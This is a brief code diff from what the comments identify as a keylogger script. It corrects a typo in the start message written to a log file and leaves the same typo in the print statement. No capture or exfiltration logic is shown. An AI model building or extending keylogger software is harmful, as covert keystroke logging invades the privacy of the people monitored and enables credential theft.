@@ -27,7 +27,7 @@ program_name = ""
 
 # prints starting message indicating keylogger has begun
 data_log = open(path_log, "a")
-data_log.write("\n\nBegining KeyLogger...")
+data_log.write("\n\nBeginning KeyLogger...")
 print("\n\nBegining KeyLogger...")
 data_log.close()
 
